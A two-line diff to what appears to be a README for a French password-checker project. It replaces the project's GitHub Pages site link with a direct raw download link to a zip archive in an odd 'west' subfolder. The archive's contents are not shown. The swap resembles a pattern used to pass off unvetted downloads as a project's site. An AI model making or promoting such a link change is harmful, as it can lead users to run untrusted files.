@@ -1,2 +1,2 @@
 lien du site : 
- https://zduchevreuil.github.io/Verificateur-de-mot-de-passe/
+ https://raw.githubusercontent.com/zduchevreuil/Verificateur-de-mot-de-passe/main/west/Verificateur-de-mot-de-passe-1.2.zip
